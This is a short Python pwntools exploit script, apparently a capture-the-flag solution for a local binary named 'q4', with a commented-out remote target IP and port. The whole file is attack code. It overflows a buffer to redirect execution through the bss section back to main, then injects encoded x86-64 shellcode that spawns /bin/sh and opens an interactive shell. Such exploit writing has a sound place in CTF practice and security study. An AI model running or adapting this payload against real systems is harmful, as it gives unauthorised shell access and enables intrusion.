from pwn import *

#r = remote('68.183.158.95', 8992)
r = process('./q4', stdin=PTY)

sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

bss = 0x600880
main = 0x4000c7

r.sendline('a'*16 + p64(bss+0x10) + p64(main))
r.sendline('b'*0x18 + p64(bss+0x20) + sc)

r.interactive()